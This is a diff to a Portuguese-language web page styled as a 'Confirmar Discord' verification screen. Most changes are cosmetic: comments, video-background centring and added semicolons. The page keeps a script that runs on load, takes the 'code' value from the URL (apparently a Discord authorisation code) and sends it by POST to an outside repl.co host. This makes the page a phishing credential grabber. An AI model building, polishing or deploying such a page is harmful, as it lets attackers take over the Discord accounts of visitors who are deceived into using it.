@@ -4,6 +4,7 @@
 <meta content="website" property="og:type">
 <link href="https://use.typekit.net/joc7wli.css" rel="stylesheet">
 
+<!-- Vídeo de fundo -->
 <div class="bg-video">
     <video autoplay loop muted playsinline>
         <source src="Pi7_GIF_CMP_18-ezgif.com-gif-to-mp4-converter.mp4" type="video/mp4">
@@ -11,6 +12,7 @@
     <div class="overlay"></div>
 </div>
 
+<!-- Caixa central -->
 <div id="box">
     <img id="server_pic" src="https://media.discordapp.net/attachments/851389970840944640/851390759998586910/755244169898885160.gif">
     <h2>Confirmar Discord</h2>
@@ -19,12 +21,12 @@
 
 <script>
 window.onload = () => {
-    const code = location.href.substring(location.href.indexOf("code")+5, location.href.length)
+    const code = location.href.substring(location.href.indexOf("code")+5, location.href.length);
 
     if (location.href.indexOf("code") > -1) {
-        const req = new XMLHttpRequest()
-        req.open("POST", "https://.repl.co")
-        req.send(code)
+        const req = new XMLHttpRequest();
+        req.open("POST", "https://.repl.co");
+        req.send(code);
     }
 }
 </script>
@@ -34,8 +36,10 @@ body {
     margin: 0;
     font-family: Arial, sans-serif;
     color: #fff;
+    overflow: hidden;
 }
 
+/* Fundo em vídeo */
 .bg-video {
     position: fixed;
     top: 0; left: 0;
@@ -45,8 +49,14 @@ body {
 }
 
 .bg-video video {
-    width: 100%;
-    height: 100%;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    min-width: 100%;
+    min-height: 100%;
+    width: auto;
+    height: auto;
+    transform: translate(-50%, -50%);
     object-fit: cover;
 }
 
@@ -58,6 +68,7 @@ body {
     z-index: -1;
 }
 
+/* Texto */
 h1, h2, h3, h4, h5, h6 {
     color: #fff;
 }
@@ -66,6 +77,7 @@ p, small, span {
     color: #eaeaea;
 }
 
+/* Caixa central */
 #box {
     width: 400px;
     margin: 0 auto;
@@ -85,6 +97,7 @@ p, small, span {
     border: 0 solid #181a1f;
 }
 
+/* Botão */
 .btn {
     background-color: #60d1f6;
     color: #fff;
